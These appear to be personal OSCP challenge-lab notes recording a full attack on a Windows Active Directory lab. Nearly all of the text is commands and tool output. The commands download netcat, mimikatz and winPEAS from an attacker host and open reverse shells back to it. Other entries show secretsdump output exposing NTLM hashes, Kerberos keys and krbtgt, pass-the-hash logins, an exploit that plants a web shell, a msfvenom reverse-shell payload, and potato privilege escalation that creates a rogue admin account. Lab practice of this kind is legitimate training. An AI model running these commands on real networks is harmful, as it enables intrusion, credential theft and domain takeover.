PS C:\Users\Administrator> $spass = ConvertTo-SecureString "vau!XCKjNQBv2$" -AsPlaintext -Force
PS C:\Users\Administrator> $cred = New-Object System.Management.Automation.PSCredential("RELIA\Administrator", $spass)

>nxc smb 172.16.173.21 -u mountuser -p 'vau!XCKjNQBv2$' -d relia.com  --continue-on-success
>nxc smb 172.16.154.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com  --shares #Listed the shares

>impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.173.21 # Got ADMIN Access

```

### Relia - 172.16.173.21

```jsx
impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.173.21
#Got Administrator access

#Doamin joined or not 
>systeminfo | findstr /B /C:"Domain"
>wmic computersystem get domain
>(Get-WmiObject Win32_ComputerSystem).Domain

>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -OutFile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>.\nc.exe 192.168.45.220 1122 -e powershell

>netexec rdp /v:172.16.154.6 /d:relia.com /u:mountuser /P:'vau!XCKjNQBv2$' /cert:ignore
>crackmapexec rdp /v:172.16.154.6 /d:relia.com /u:mountuser /P:'vau!XCKjNQBv2$' /cert:ignore
>nxc rdp /v:172.16.154.6 /d:relia.com /u:mountuser /P:'vau!XCKjNQBv2$' /cert:ignore
>hydra -L users.txt -P pass.txt 172.16.154.19 rdp # No hit

>└─$ crackmapexec smb 172.16.154.6 -d relia.com -u Administrator -p 'vau!XCKjNQBv2$' /cert:ignore  
SMB         172.16.154.6    445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:relia.com) (signing:True) (SMBv1:False)
SMB         172.16.154.6    445    DC02             [+] relia.com\Administrator:vau!XCKjNQBv2$ (Pwn3d!)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/OSCP/Relia]
└─$ crackmapexec smb 172.16.154.30 -d relia.com -u Administrator -p 'vau!XCKjNQBv2$' /cert:ignore 
SMB         172.16.154.30   445    WEBBY            [*] Windows Server 2022 Build 20348 x64 (name:WEBBY) (domain:relia.com) (signing:False) (SMBv1:False)
SMB         172.16.154.30   445    WEBBY            [+] relia.com\Administrator:vau!XCKjNQBv2$ (Pwn3d!)

```

### Relia - 172.16.154.6

```jsx
>impacket-psexec relia/Administrator:'vau!XCKjNQBv2$'@172.16.173.6

#Doamin joined or not 
>systeminfo | findstr /B /C:"Domain"
>wmic computersystem get domain
>(Get-WmiObject Win32_ComputerSystem).Domain

>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -OutFile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>.\nc.exe 192.168.45.220 1122 -e powershell

smbclient //172.16.154.6/SYSVOL -U relia/administrator%'vau!XCKjNQBv2$'

#NetNTLMv2
 Version: NetNTLMv2
  Hash:    DC02$::RELIA:1122334455667788:78a7301b094642cef9689362aea42e80:0101000000000000f251e0902d09db0139e5e2ecc43e3bc500000000080030003000000000000000000000000040000078b4a5a460630e6edd365a3ed87af2d55cdb7fee7b3d6bd8a277b73b12df245b0a00100000000000000000000000000000000000090000000000000000000000
  
  
  >evil-winrm -i relia/172.16.154.30 -u Administrator -p 'vau!XCKjNQBv2$'
  >impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.154.30  # Hit
```

### Relia - 172.16.154.30 - impacket-secretsdump with admini privileges

```jsx
>impacket-psexec relia.com/Administrator:'vau!XCKjNQBv2$'@172.16.154.30  
#Got Admin Access

>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -OutFile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>.\nc.exe 192.168.45.220 1122 -e powershell

>impacket-secretsdump relia/administrator:'vau!XCKjNQBv2$'@172.16.172.30
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xd064fb8c49257c6a6477afe192e5b75d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e0ace20a027ab482a0e0c42ce61fd2d4:::
[*] Dumping cached domain logon information (domain/username:hash)
RELIA.COM/anna:$DCC2$10240#anna#8b28f656be3a82cd33c26262155a3cba: (2022-10-20 13:11:08)
RELIA.COM/Administrator:$DCC2$10240#Administrator#8d0b95a7748459ac911dc767ee3fd4b2: (2022-10-20 14:10:58)
RELIA.COM/michelle:$DCC2$10240#michelle#758c1665fd06bf2ac8a633a959794f4f: (2022-10-27 09:07:32)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\WEBBY$:aes256-cts-hmac-sha1-96:79df289191ad98441d036286ce368f0613e2993389884bcd0ab9406ac8130cc0
RELIA\WEBBY$:aes128-cts-hmac-sha1-96:a26f05c131098a183840dc3b92feae7d
RELIA\WEBBY$:des-cbc-md5:c257794040467a04
RELIA\WEBBY$:plain_password_hex:c7f98cb8fb317623ad17c8f8454ebacf80888ddee5372679b2b3cdca1e00e0cb857a4154891eff9bba4e8887d301eeecfa6af35c06c411a0ed77e440342c042faa58850ece579b7c097da3cb952dd46d65ed27da473652d046ebbbe83af682d25ca92f8be06a1075687527bb7a7bb05b53a6cdcae93467258e751aae8724f2cdc877b257c24fa4b22bececa0a00a9d182a8b05814dcb851fa9ca234dab4aa4334517dd158c5428ab8d826f5179370e232998e7359ff25e9ebf7117d9d971bfc3f957b841a59c9197c8e8b6d536b7ea4e31afba514f78b7d64bfc472c4c40ae29f3c8f4106aa4b92e264c9ae4c3ae1aa2
RELIA\WEBBY$:aad3b435b51404eeaad3b435b51404ee:5c0c47cd72af3d4b489ccc654598e4c8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe35476bb28010f5347d3706714000de107f0d9eb
dpapi_userkey:0x1d8f63f460e27c44dee0039cc9802e9c46fa98fe
[*] NL$KM 
 0000   22 D9 0C AD BC 8E 2B 5B  95 AF AB 05 53 A2 60 01   ".....+[....S.`.
 0010   53 E8 B4 08 05 04 21 8C  21 B5 5C EF FA 96 90 87   S.....!.!.\.....
 0020   68 64 7E 65 4B 1E B2 80  08 D4 D8 DD 59 62 BF 43   hd~eK.......Yb.C
 0030   B4 86 43 B9 CC 75 3E B4  19 2D CC 2F 72 DB 66 CC   ..C..u>..-./r.f.
NL$KM:22d90cadbc8e2b5b95afab0553a2600153e8b4080504218c21b55ceffa96908768647e654b1eb28008d4d8dd5962bf43b48643b9cc753eb4192dcc2f72db66cc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

### Relia - 192.168.212.189

```jsx
#Hit
>impacket-secretsdump relia/administrator:'vau!XCKjNQBv2$'@172.16.172.30
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xd064fb8c49257c6a6477afe192e5b75d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e0ace20a027ab482a0e0c42ce61fd2d4:::
[*] Dumping cached domain logon information (domain/username:hash)
RELIA.COM/anna:$DCC2$10240#anna#8b28f656be3a82cd33c26262155a3cba: (2022-10-20 13:11:08)
RELIA.COM/Administrator:$DCC2$10240#Administrator#8d0b95a7748459ac911dc767ee3fd4b2: (2022-10-20 14:10:58)
RELIA.COM/michelle:$DCC2$10240#michelle#758c1665fd06bf2ac8a633a959794f4f: (2022-10-27 09:07:32)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\WEBBY$:aes256-cts-hmac-sha1-96:79df289191ad98441d036286ce368f0613e2993389884bcd0ab9406ac8130cc0
RELIA\WEBBY$:aes128-cts-hmac-sha1-96:a26f05c131098a183840dc3b92feae7d
RELIA\WEBBY$:des-cbc-md5:c257794040467a04
RELIA\WEBBY$:plain_password_hex:c7f98cb8fb317623ad17c8f8454ebacf80888ddee5372679b2b3cdca1e00e0cb857a4154891eff9bba4e8887d301eeecfa6af35c06c411a0ed77e440342c042faa58850ece579b7c097da3cb952dd46d65ed27da473652d046ebbbe83af682d25ca92f8be06a1075687527bb7a7bb05b53a6cdcae93467258e751aae8724f2cdc877b257c24fa4b22bececa0a00a9d182a8b05814dcb851fa9ca234dab4aa4334517dd158c5428ab8d826f5179370e232998e7359ff25e9ebf7117d9d971bfc3f957b841a59c9197c8e8b6d536b7ea4e31afba514f78b7d64bfc472c4c40ae29f3c8f4106aa4b92e264c9ae4c3ae1aa2
RELIA\WEBBY$:aad3b435b51404eeaad3b435b51404ee:5c0c47cd72af3d4b489ccc654598e4c8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe35476bb28010f5347d3706714000de107f0d9eb
dpapi_userkey:0x1d8f63f460e27c44dee0039cc9802e9c46fa98fe
[*] NL$KM 
 0000   22 D9 0C AD BC 8E 2B 5B  95 AF AB 05 53 A2 60 01   ".....+[....S.`.
 0010   53 E8 B4 08 05 04 21 8C  21 B5 5C EF FA 96 90 87   S.....!.!.\.....
 0020   68 64 7E 65 4B 1E B2 80  08 D4 D8 DD 59 62 BF 43   hd~eK.......Yb.C
 0030   B4 86 43 B9 CC 75 3E B4  19 2D CC 2F 72 DB 66 CC   ..C..u>..-./r.f.
NL$KM:22d90cadbc8e2b5b95afab0553a2600153e8b4080504218c21b55ceffa96908768647e654b1eb28008d4d8dd5962bf43b48643b9cc753eb4192dcc2f72db66cc
[*] Cleaning up... 
[*] Stopping service RemoteRegistry,

I tried with -------------------------
crackmapexec winrm 192.168.212.189 -d relia.com -u users.txt -p pass.txt  /cert:ignore 
WINRM       192.168.212.189 5985   192.168.212.189  [+] relia.com\Administrator:vau!XCKjNQBv2$ (Pwn3d!)

./psexec.py -hashes :758c1665fd06bf2ac8a633a959794f4f relia.com/michelle@192.168.212.189
./psexec.py -hashes :8d0b95a7748459ac911dc767ee3fd4b2 relia.com/administrator@192.168.212.189
./psexec.py -hashes :8b28f656be3a82cd33c26262155a3cba relia.com/anna@192.168.212.189 
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c6290d630dfc5e4ebce170090be7e0cf relia.com/administrator@192.168.212.189

#Credentils from 172.16.172.6
impacket-secretsdump relia/administrator:"vau\!XCKjNQBv2$"@172.16.172.6 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x5134f539f916174432bd178912ae1162
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec341e4a24f0f7db215b90f14f6e12b5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
RELIA\DC02$:aes256-cts-hmac-sha1-96:a62c891f36a0a49cc7ea464cc6df3eeefb2d77b21bed5625721b57df3d6b698b
RELIA\DC02$:aes128-cts-hmac-sha1-96:44aa1293641441dfa1fd899f1183371c
RELIA\DC02$:des-cbc-md5:6badbc7c2ada0bd0
RELIA\DC02$:plain_password_hex:8b89bf929bf23b2bfd12acde2bee2f463d11b9d05582515f05a88ee54a594674b6e8ff2faa19fff2e5252c2327ffa94e476dde6c0eff012c0d179fb4600d83c0fe98e1c7bf81974899de7f6644505eb89c294db8cadf1a4375153d43c52713da449fa5a117e51c064a7699cdd19902205cbcd92d5c1e026188262392cfabdd74ea55ec06da7cbeb09650fb95fa52e4f43eb0915f9bc96091d7fb57e5a163157e7f0af4b3aa19f8e17eb5fc0e3b001242067344d93249e71aefe56599a6c7a53b5bce3ab1d94e1a88fe3dc9d396ce9c9c2777590e237e0c81360856b5eb70692400d1a9e77173fdda24b62012a4306a38
RELIA\DC02$:aad3b435b51404eeaad3b435b51404ee:ad687856aa97635eb57523211e66d602:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x389a45b7e84fa30fce73b9f921b7628d6430f2cd
dpapi_userkey:0x89b8e60e5b192f01d54ea880de4ccb2c419ae46c
[*] NL$KM 
 0000   5B A6 CD 9F CD 69 27 89  3B D2 4F 79 97 25 83 B3   [....i'.;.Oy.%..
 0010   81 22 32 BA 54 FA D2 4E  EB B0 54 10 42 F0 D7 06   ."2.T..N..T.B...
 0020   B7 9C E8 CE E4 82 7F 3A  91 E3 17 EF 1B 7E 26 79   .......:.....~&y
 0030   14 34 72 89 A6 AD 4B C1  BE 19 A1 03 D0 F0 59 AA   .4r...K.......Y.
NL$KM:5ba6cd9fcd6927893bd24f79972583b3812232ba54fad24eebb0541042f0d706b79ce8cee4827f3a91e317ef1b7e267914347289a6ad4bc1be19a103d0f059aa
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:60446f9e333abfda8c548cbe11daedc2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b896b5f9c769cd04d97008292674c1a5:::
relia.com\maildmz:1103:aad3b435b51404eeaad3b435b51404ee:ddbe308ff30d828d484098d1c75c6166:::
relia.com\jim:1104:aad3b435b51404eeaad3b435b51404ee:be5cb823ee026304b6ed0cd356e34a3c:::
relia.com\michelle:1105:aad3b435b51404eeaad3b435b51404ee:18d4098c8d9ff721745b388ad4a442bf:::
relia.com\andrea:1106:aad3b435b51404eeaad3b435b51404ee:ce3f12443651168b3793f5fbcccff9db:::
relia.com\mountuser:1107:aad3b435b51404eeaad3b435b51404ee:6a2f774420368de1567dea28ab0d3988:::
relia.com\iis_service:1108:aad3b435b51404eeaad3b435b51404ee:bb4136aaa06fe1688b300e2f9243e85b:::
relia.com\internaladmin:1109:aad3b435b51404eeaad3b435b51404ee:65a883e27cc4714738dfe4dce95001db:::
relia.com\larry:1110:aad3b435b51404eeaad3b435b51404ee:47995d3e82d8e698f9b1a9d78c90aa7e:::
relia.com\jenny:1111:aad3b435b51404eeaad3b435b51404ee:5ef6ddc308ac24d5423c0b983eee159c:::
relia.com\brad:1113:aad3b435b51404eeaad3b435b51404ee:970ba7d4c92f712d0363706d6144c058:::
relia.com\anna:1114:aad3b435b51404eeaad3b435b51404ee:f79bec80e693e632f973d32b3489af18:::
relia.com\dan:1123:aad3b435b51404eeaad3b435b51404ee:4b22394fc907bd7a74d1af6cc9aca348:::
relia.com\milana:1124:aad3b435b51404eeaad3b435b51404ee:2237ff5905ec2fd9ebbdfa3a14d1b2b6:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:ad687856aa97635eb57523211e66d602:::
MAIL$:1119:aad3b435b51404eeaad3b435b51404ee:ceb5139fc570de96dc974dde1d6d56ae:::
LOGIN$:1120:aad3b435b51404eeaad3b435b51404ee:efd10e30dbfe86d7d249376cf459db5d:::
WK01$:1121:aad3b435b51404eeaad3b435b51404ee:619898246c55cf44a9a3121a3c90bd94:::
WK02$:1122:aad3b435b51404eeaad3b435b51404ee:093cd524e2b71ddf1e63aaa2fc563263:::
INTRANET$:1125:aad3b435b51404eeaad3b435b51404ee:31a107b55217b3627b94b37cd68e7240:::
FILES$:1126:aad3b435b51404eeaad3b435b51404ee:0690d90fec24925588714bf740b8e958:::
WEBBY$:1127:aad3b435b51404eeaad3b435b51404ee:5c0c47cd72af3d4b489ccc654598e4c8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:16b60b6055364550c0389e45e800d5bd97faccd5e5fb933f65d0950e7f7354b4
Administrator:aes128-cts-hmac-sha1-96:702fe1f9ce3c6e2b49ade7653bfda410
Administrator:des-cbc-md5:0454b510c82915ae
krbtgt:aes256-cts-hmac-sha1-96:3c0c55e8a4912ffb410a35b867125a7b15868704f1e0b3365733d7402930069d
krbtgt:aes128-cts-hmac-sha1-96:c19d37e81b84ac5b2fe02b8e1219d1e7
krbtgt:des-cbc-md5:c8b6384613585db3
relia.com\maildmz:aes256-cts-hmac-sha1-96:cb7f0e43ecbb059fc42982f8cb5832f089b41e1a0c39927099d1a414858ae7f6
relia.com\maildmz:aes128-cts-hmac-sha1-96:fc99e971846d5ff69c2de3dcdb8cad52
relia.com\maildmz:des-cbc-md5:a7f12fec6ea4fdb3
relia.com\jim:aes256-cts-hmac-sha1-96:3543128af0d8da8ab5851239d21435cb000efac857aa5d8e155891a61d5536bc
relia.com\jim:aes128-cts-hmac-sha1-96:4b2d51926d0bbf3d9b4e3e9881614f56
relia.com\jim:des-cbc-md5:a7e98f5d54dff29e
relia.com\michelle:aes256-cts-hmac-sha1-96:ebd85af2e578051b14f5f4fbfabb00a3a9d9393bd8c448513b8d77d66905a37d
relia.com\michelle:aes128-cts-hmac-sha1-96:95112aa40707f02d48c57dcee1aa7d38
relia.com\michelle:des-cbc-md5:167a8c85b085382c
relia.com\andrea:aes256-cts-hmac-sha1-96:fefbc06e926a8c67df45efbfc02b550f6155f1fa485637bdabc0161cacda61cb
relia.com\andrea:aes128-cts-hmac-sha1-96:a7678b75357eeb4cd6e9d8b454bac8b7
relia.com\andrea:des-cbc-md5:9dd0fd3dec7a43d5
relia.com\mountuser:aes256-cts-hmac-sha1-96:7981485c2b4ea718c9b1540832233ba4a3dea6b892f1d71d726be350de8d6787
relia.com\mountuser:aes128-cts-hmac-sha1-96:c42b56f698f8febf2e4760aa5aefe6a0
relia.com\mountuser:des-cbc-md5:5b494f5e15167501
relia.com\iis_service:aes256-cts-hmac-sha1-96:467eade799b673e13aab9b105f74969df7cd5548fc96b93597e8562fec78ef2a
relia.com\iis_service:aes128-cts-hmac-sha1-96:7167de4e95f6c915bcee7c3a7ea4191a
relia.com\iis_service:des-cbc-md5:040ee0ce9801e6d6
relia.com\internaladmin:aes256-cts-hmac-sha1-96:2502e64b8eaea1258d93293a5ce87fd4ef3b0ae2bd3ce1e8b01119121ea1afaf
relia.com\internaladmin:aes128-cts-hmac-sha1-96:f1df762b209ec947f11daaad6fe3f11b
relia.com\internaladmin:des-cbc-md5:9e2c8afddffed55b
relia.com\larry:aes256-cts-hmac-sha1-96:bff53d9c1b4b2e050db3d778e50430323d6163ae9b147154e1432e5b5327b00f
relia.com\larry:aes128-cts-hmac-sha1-96:c98dd28e8f4d86c38d5d5b076a64886d
relia.com\larry:des-cbc-md5:bc7c1ff75d19ab19
relia.com\jenny:aes256-cts-hmac-sha1-96:f64c1fd34c4ca15b5de420aac51dd656951e2cb5fe0a539ad84690284ef43d7f
relia.com\jenny:aes128-cts-hmac-sha1-96:e054a5850c941019a7433b90c63a1ed9
relia.com\jenny:des-cbc-md5:fb13aed6fe98ba38
relia.com\brad:aes256-cts-hmac-sha1-96:67803389e653909cf70cc0392032877cf1d07d42827e7c6f5c2e1e8ff4ecb553
relia.com\brad:aes128-cts-hmac-sha1-96:f8fdbbfba24356563e12bf044a3b6bb4
relia.com\brad:des-cbc-md5:45265e08fbced0a8
relia.com\anna:aes256-cts-hmac-sha1-96:894923e65e97ed8627dcd80328613a1721440ef6f6faea6f6a58735969e052ab
relia.com\anna:aes128-cts-hmac-sha1-96:d5ce8f92ad8ec94fb6058039e3756560
relia.com\anna:des-cbc-md5:fe6e61349dcee57a
relia.com\dan:aes256-cts-hmac-sha1-96:f1f68e4fed320d4c21d599a8856ebc3f03faa53184ae6088b7a3f397554ef044
relia.com\dan:aes128-cts-hmac-sha1-96:2125bb415b56ff5035bd555b8defc79e
relia.com\dan:des-cbc-md5:941f34a8c4c7202c
relia.com\milana:aes256-cts-hmac-sha1-96:8ae66251b65eacff7929a77f56c1feedb7e6e4b5fc86f225e8256fd29acc0ad0
relia.com\milana:aes128-cts-hmac-sha1-96:8404b82bc7dc78e138accf7ddc8abd1c
relia.com\milana:des-cbc-md5:40dc076ed0469d85
DC02$:aes256-cts-hmac-sha1-96:a62c891f36a0a49cc7ea464cc6df3eeefb2d77b21bed5625721b57df3d6b698b
DC02$:aes128-cts-hmac-sha1-96:44aa1293641441dfa1fd899f1183371c
DC02$:des-cbc-md5:57d3688a64cde013
MAIL$:aes256-cts-hmac-sha1-96:0abf16a5eef255cb6f1e78ea5dca79b872696348d27ef09fba41ccbf4cb4dff3
MAIL$:aes128-cts-hmac-sha1-96:6b265fb361385b18d1f995cb3048dd94
MAIL$:des-cbc-md5:587985e0312a8f79
LOGIN$:aes256-cts-hmac-sha1-96:7c1c228379de9df5e284f18f27bfc35539c79fb79b9037ae50c99e0555d8841d
LOGIN$:aes128-cts-hmac-sha1-96:5be347dcd9a34ebe70073e2fb6312c8a
LOGIN$:des-cbc-md5:520e6210e6ad8ff4
WK01$:aes256-cts-hmac-sha1-96:e827069623914606d84e39493cee46cfdc6cb2a803bc9f62ca2599bfb6d7feee
WK01$:aes128-cts-hmac-sha1-96:5fba6809e426e4e6a3c8be78b8b433b1
WK01$:des-cbc-md5:eccb850bec8f0416
WK02$:aes256-cts-hmac-sha1-96:72b626b0250646a0899beaaf0bfa916a7ed11e2ed7356f03635750e228e0a3e7
WK02$:aes128-cts-hmac-sha1-96:659e38811e6e8e07a73e6cf080226199
WK02$:des-cbc-md5:07575d646864521c
INTRANET$:aes256-cts-hmac-sha1-96:10dbbd3285b152abd48beafc83187d2e2e97e086ed3837d51319435c0335012f
INTRANET$:aes128-cts-hmac-sha1-96:2563b8910dfa08c54e82c6a8ec69d1b9
INTRANET$:des-cbc-md5:abcd9e67d9084326
FILES$:aes256-cts-hmac-sha1-96:3ad7428823f48b0cf65cbbea79aa656ed20f8e6e5c22324a1ce3357548212131
FILES$:aes128-cts-hmac-sha1-96:3e445a3667a29d6b7c5913e1a3b8bc3a
FILES$:des-cbc-md5:402f31e6df7a5823
WEBBY$:aes256-cts-hmac-sha1-96:79df289191ad98441d036286ce368f0613e2993389884bcd0ab9406ac8130cc0
WEBBY$:aes128-cts-hmac-sha1-96:a26f05c131098a183840dc3b92feae7d
WEBBY$:des-cbc-md5:e97f57d0fee05710
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

#Hit
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:65a883e27cc4714738dfe4dce95001db relia.com/internaladmin@192.168.212.189
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:4b22394fc907bd7a74d1af6cc9aca348 relia.com/dan@192.168.212.189

```

# OSCP A

### AD

with 2 internal networks

![image.png](OSCP%20Videos%20Challenge%20Labs%203306187b1f27408096b6bf169fdf3f00/image%202.png)

```jsx
     http://192.168.204.141/

# http://192.168.204.141 Their is website with kind of form but their is no backend functionality to send the data to the backend

- Captured in 2 forms  Burp their is no response, might be not connected to the backend
whatweb http://192.168.204.141        
http://192.168.204.141 [200 OK] Apache[2.4.51], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.51 (Win64) PHP/7.4.26], IP[192.168.204.141], JQuery, MetaGenerator[Nicepage 4.8.2, nicepage.com], Open-Graph-Protocol[website], PHP[7.4.26], Script[application/ld+json,text/javascript], Title[Home]
gobuster dir -u http://192.168.204.141 -w /usr/share/wordlists/dirb/big.txt
-Blog. Images, scripts

# http://192.168.204.141:81 Their is website with kind of form but their is no backend functionality to send the data to the backend
-Captured the request their is error with mysql
whatweb http://192.168.204.141:81
http://192.168.204.141:81 [200 OK] Apache[2.4.51], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.51 (Win64) PHP/7.4.26], IP[192.168.204.141], JQuery, PHP[7.4.26], Script[text/javascript], Title[Attendance and Payroll System], X-Powered-By[PHP/7.4.26], X-UA-Compatible[IE=edge]
gobuster dir -u http://192.168.204.141 -w /usr/share/wordlists/dirb/big.txt
-ADMIN (Login page), DB(Some .sql file), build (Some Development data), dist, plugins, tcpdf
-apsystem.sql file has tables information 
INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
(1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
https://hashes.com/en/decrypt/hash - password
-mysql -h 192.168.204.141 -u 'nurhodelta' -p 'password' # No
- Tried login with admin, nurhodelta and remaining 3 users with first anme and lastname no hit

#SMB Enumeration
crackmapexec smb 192.168.204.141 -u '' -p ''  # reveled domain
>smbclient -L ////192.168.204.141 
>rpcclient -U ‘’ 192.168.204.141
>rpcclient -U "" -N 192.168.204.141
>smbclient -L ////192.168.204.141 -U nurhodelta
>enum4linux 192.168.204.141
>netexec smb 192.168.204.141 -d oscp.exam -u 'nurhodelta' -p 'password'
>nxc smb 192.168.204.141 -d oscp.exam -u 'nurhodelta' -p 'password'
>crackmapexec smb 192.168.204.141 -d oscp.exam -u 'nurhodelta' -p 'password'
Exploit
>evil-winrm -i oscp.exam/192.168.204.141 -u nurhodelta -p 'password'
>impacket-psexec oscp.exam/nurhodelta:password@192.168.212.189

#Searchsploit
searchsploit Attendance and Payroll System                
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Attendance and Payroll System v1.0 - Remote Code Execution (RCE)                                                                                                                                      | php/webapps/50801.py
Attendance and Payroll System v1.0 - SQLi Authentication Bypass                                                                                                                                           | php/webapps/50802.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

>python3 50801.py http://192.168.204.141:81/admin/index.php
    >> Attendance and Payroll System v1.0
    >> Unauthenticated Remote Code Execution
    >> By pr0z

[*] Uploading the web shell to http://192.168.204.141:81/admin/index.php
[*] Validating the shell has been uploaded to http://192.168.204.141:81/admin/index.php
[✓] Successfully connected to web shell

RCE > ls
#Nothing is working

>python3 50802.py http://192.168.204.141:81/admin/index.php
PHPSESSID: t12eofdk0845f2peolfh6vbhan

IN 50801 remove /apsystem/path because this direct path is /admin/shell.php
>python3 50801.py http://192.168.204.141:81
#Shell running on the path no need to mention the full path
pwd, ls commands not work
RCE > dir C:\Users\                    
 Volume in drive C has no label.
 Volume Serial Number is 3C99-887F

 Directory of C:\Users

11/21/2022  12:40 AM    <DIR>          .
11/21/2022  12:40 AM    <DIR>          ..
03/25/2022  01:08 PM    <DIR>          Administrator
11/10/2022  03:06 AM    <DIR>          Administrator.OSCP
06/12/2024  03:55 AM    <DIR>          celia.almeda
06/12/2024  03:55 AM    <DIR>          Mary.Williams
11/19/2020  12:48 AM    <DIR>          Public
12/05/2022  06:47 AM    <DIR>          support
11/14/2022  12:23 AM    <DIR>          web_svc
               0 File(s)              0 bytes
               9 Dir(s)  11,151,855,616 bytes free
RCE > whoami /priv
Privilege Name                        				 Description										                               State   
============================= ========================================= ========
SeShutdownPrivilege                			Shut down the system                						       Disabled
SeChangeNotifyPrivilege       			Bypass traverse checking               					   Enabled 
SeUndockPrivilege                     			Remove computer from docking station      Disabled
SeImpersonatePrivilege         			Impersonate a client after authentication 	Enabled 
SeCreateGlobalPrivilege        			 Create global objects                    						    Enabled 
SeIncreaseWorkingSetPrivilege    Increase a process working set            				Disabled
SeTimeZonePrivilege                           Change the time zone                     					    Disabled

RCE > 

>dir
>dir C:\Users\Mary.Williams\Desktop
>dir C:\Users\celia.almeda\Desktop

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.220 LPORT=4444 -f exe -o met4444.exe
>iwr -uri http://192.168.45.220:8000/met4444.exe -Outfile C:\Users\celia.almeda\Desktop\met.exe
>certutil.exe -urlcache -f http://192.168.45.220:8000/met4444.exe met.exe
>rlwrap nc -nlvp 4444
#Got the shell
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -Outfile winPEAS.exe
>iwr -uri http://192.168.45.220:8000/DeadPotato-NET4.exe -Outfile Deadpotato.exe
>.\Deadpotato.exe -newadmin ashok:Ashok@123
#Error with password policy
>.\Deadpotato.exe -newadmin ashok:iRGxv26fsPYH
PS C:\Users\Mary.Williams\Desktop> net localgroup administrators
Members
-------------------------------------------------------------------------------
Administrator
ashok
OSCP\Domain Admins
The command completed successfully.
#Deadpotato added user into admin group not given any shell

